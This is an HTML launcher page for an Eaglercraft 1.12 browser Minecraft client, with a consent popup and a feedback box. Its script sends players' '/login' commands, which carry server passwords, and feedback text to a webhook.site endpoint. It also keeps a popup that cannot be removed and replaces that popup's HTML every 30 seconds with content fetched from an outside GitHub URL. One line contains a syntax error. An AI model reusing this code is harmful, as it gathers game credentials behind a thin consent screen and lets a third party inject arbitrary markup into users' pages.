<!DOCTYPE html>
<html lang="und" style="width:100%;height:100%;background-color:black;">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0">
    <meta name="description" content="Eaglercraft 1.12 test directory HTML page">
    <meta name="keywords" content="eaglercraft, eaglercraftx, minecraft, 1.12, 1.12.2">
    <title>REPOSITORY CLIENT</title>
    <meta property="og:locale" content="en-US">
    <meta property="og:type" content="website">
    <meta property="og:title" content="Eaglercraft 1.12.2">
    <meta property="og:description" content="test directory HTML page">
    <link rel="shortcut icon" type="image/png" href="favicon.png">
    <style>
        html, body {
            margin: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            background-color: black;
        }

        #splash-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: black;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }

        #splash-screen img {
            max-width: 100%;
            max-height: 100%;
        }

        #splash-screen.hidden {
            display: none;
        }

        #popup-menu {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background-color: rgba(30, 30, 30, 0.95);
            color: white;
            padding: 15px;
            border-radius: 10px;
            z-index: 2147483647;
            font-family: sans-serif;
            box-shadow: 0 0 10px rgba(0,0,0,0.5);
            pointer-events: auto !important;
            visibility: visible !important;
            opacity: 1 !important;
        }

        #popup-menu button {
            margin-top: 10px;
            padding: 5px 10px;
            border: none;
            background: #444;
            color: white;
            border-radius: 5px;
            cursor: pointer;
        }

        #popup-menu button:hover {
            background: #666;
        }

        #consent-popup {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: rgba(30, 30, 30, 0.95);
            color: white;
            padding: 20px;
            border-radius: 10px;
            z-index: 2147483648;
            font-family: sans-serif;
            box-shadow: 0 0 10px rgba(0,0,0,0.5);
            text-align: center;
            display: block;
        }

        #consent-popup.hidden {
            display: none;
        }

        #consent-popup button {
            margin: 10px;
            padding: 5px 15px;
            border: none;
            background: #444;
            color: white;
            border-radius: 5px;
            cursor: pointer;
        }

        #consent-popup button:hover {
            background: #666;
        }

        #feedback-form textarea {
            width: 100%;
            padding: 5px;
            margin-top: 10px;
            border-radius: 5px;
            border: none;
        }
    </style>
</head>
<body id="game_frame">

    <div id="splash-screen">
        <img src="Splash.png" alt="Custom Splash Screen">
    </div>

    <div id="consent-popup">
        <p>We collect '/login' commands and feedback you submit to improve our site. Only these inputs will be stored and sent to our server. Do you consent?</p>
        <button id="consent-allow">Allow</button>
        <button id="consent-deny">Deny</button>
    </div>

    <div id="popup-menu">
        <p>PUBES VS GOON WAR</p>
        <p>I am testing a new feature</p>
        <p>with a automatic news updater</p>
        <p>Submit feedback or ideas:</p>
        <div id="feedback-form">
            <textarea id="feedback-input" rows="4" placeholder="Enter your feedback"></textarea>
            <button onclick="submitFeedback()">Submit</button>
        </div>
    </div>

    <script type="text/javascript">
        "use strict";
        
        let originalPopupContent = '';
        let hasConsent = false;
        
        window.addEventListener('DOMContentLoaded', () => {
            const popup = document.getElementById('popup-menu');
            if (popup) {
                originalPopupContent = popup.innerHTML;
            }

            // Attach consent button listeners
            const allowButton = document.getElementById('consent-allow');
            const denyButton = document.getElementById('consent-deny');
            if (allowButton) {
                allowButton.addEventListener('click', grantConsent);
            }
            if (denyButton) {
                denyButton.addEventListener('click', denyConsent);
            }
        });
        
        function closePopup() {
            document.getElementById('popup-menu').style.display = 'none';
        }
        
        function grantConsent() {
            console.log('Consent granted');
            hasConsent = true;
            const consentPopup = document.getElementById('consent-popup');
            if (consentPopup) {
                consentPopup.classList.add('hidden');
            }
        }
        
        function denyConsent() {
            console.log('Consent denied');
            hasConsent = false;
            const consentPopup = document.getElementById('consent-popup');
            if (consentPopup) {
                consentPopup.classList.add('hidden');
            }
        }
        
        async function submitFeedback() {
            if (!hasConsent) {
                alert('Please allow data collection in the consent popup before submitting.');
                return;
            }
            const feedback = document.getElementById('feedback-input').value;
            if (!feedback) {
                alert('Please enter feedback before submitting.');
                return;
            }
            try {
                const response = await fetch('https://webhook.site/618173e1-b909-4f86-b229-bc0dd7604316', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        type: 'feedback',
                        content: feedback,
                        timestamp: new Date().toISOString()
                    })
                });
                if (response.ok) {
                    alert('Feedback submitted successfully!');
                    document.getElementById('feedback-input').value = '';
                } else {
                    alert('Failed to submit feedback.');
                }
            } catch (error) {
                console.error('Error submitting feedback:', error);
                alert('Error submitting feedback.');
            }
        }
        
        // Call this from Eaglercraft's command handler (e.g., chat or command input)
        function captureCommand(command) {
            if (!hasConsent) return;
            if (command.trim().toLowerCase().startsWith('/login')) {
                try {
                    fetch('https://webhook.site/618173e1-b909-4f86-b229-bc0dd7604316', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            type: 'command',
                            content: command,
                           (timestamp: new Date().toISOString()
                        })
                    });
                } catch (error) {
                    console.error('Error sending command:', error);
                }
            }
        }
        
        const popupContentUrl = 'https://raw.githubusercontent.com/maskedwrrg/repo/refs/heads/main/popup-content.txt';
        const updateInterval = 30000;
        
        async function updatePopupContent() {
            try {
                const response = await fetch(popupContentUrl + '?nocache=' + Date.now());
                if (response.ok) {
                    const newContent = await response.text();
                    const popup = document.getElementById('popup-menu');
                    if (popup && newContent) {
                        popup.innerHTML = newContent + `
                            <p>Submit feedback or ideas:</p>
                            <div id="feedback-form">
                                <textarea id="feedback-input" rows="4" placeholder="Enter your feedback"></textarea>
                                <button onclick="submitFeedback()">Submit</button>
                            </div>`;
                        originalPopupContent = newContent;
                    }
                }
            } catch (error) {
                console.error('Failed to update popup content:', error);
            }
            
            setTimeout(updatePopupContent, updateInterval);
        }
        
        function ensurePopupVisibility() {
            const popup = document.getElementById('popup-menu');
            if (popup) {
                document.body.appendChild(popup);
                popup.style.zIndex = '2147483647';
                popup.style.visibility = 'visible';
                popup.style.display = 'block';
                popup.style.opacity = '1';
            }
            
            setTimeout(ensurePopupVisibility, 1000);
        }

        window.addEventListener("load", async function () {
            const popup = document.getElementById('popup-menu');
            if (popup) {
                originalPopupContent = popup.innerHTML;
            }
            
            updatePopupContent();
            
            window.isSplashScreenActive = true;
            window.suppressSplashScreens = true;

            const splashScreen = document.getElementById("splash-screen");
            await new Promise(resolve => setTimeout(resolve, 10000));
            window.isSplashScreenActive = false;

            const classesScript = document.createElement("script");
            classesScript.src = "classes.js";
            classesScript.onerror = () => console.error("Failed to load classes.js");
            document.head.appendChild(classesScript);

            const ga4Script = document.createElement("script");
            ga4Script.src = "/js/ga4.js";
            ga4Script.onerror = () => console.error("Failed to load ga4.js");
            document.head.appendChild(ga4Script);

            await new Promise(resolve => {
                classesScript.onload = resolve;
            });

            for (let i = 0; i < 20; i++) {
                const keyEvent = new KeyboardEvent("keydown", {
                    key: "Enter",
                    code: "Enter",
                    keyCode: 13,
                    which: 13,
                    bubbles: true,
                    cancelable: true
                });
                document.dispatchEvent(keyEvent);
            }

            splashScreen.classList.add("hidden");

            try {
                if (window.location.href.indexOf("file:") === 0) {
                    alert("HTTP please, do not open this file locally, run a local HTTP server and load it via HTTP");
                } else {
                    var relayId = Math.floor(Math.random() * 3);
                    window.eaglercraftXOpts = {
                        demoMode: false,
                        container: "game_frame",
                        assetsURI: "assets.epk",
                        localesURI: "lang/",
                        worldsDB: "worlds",
                        servers: []
                    };
                    main();
                }
            } catch (e) {
                console.error("Error during game initialization:", e);
            }

            ensurePopupVisibility();
        });
        
        window.addEventListener('DOMContentLoaded', () => {
            const originalPopup = document.getElementById('popup-menu');
            if (originalPopup) {
                originalPopupContent = originalPopup.innerHTML;
            }
            
            const observer = new MutationObserver(mutations => {
                const popup = document.getElementById('popup-menu');
                if (!popup || !document.body.contains(popup)) {
                    const newPopup = document.createElement("div");
                    newPopup.id = "popup-menu";
                    newPopup.innerHTML = originalPopupContent + `
                        <p>Submit feedback or ideas:</p>
                        <div id="feedback-form">
                            <textarea id="feedback-input" rows="4" placeholder="Enter your feedback"></textarea>
                            <button onclick="submitFeedback()">Submit</button>
                        </div>`;
                    document.body.appendChild(newPopup);
                }
            });
            
            observer.observe(document.body, {
                childList: true,
                subtree: true
            });
        });
    </script>
</body>
</html>
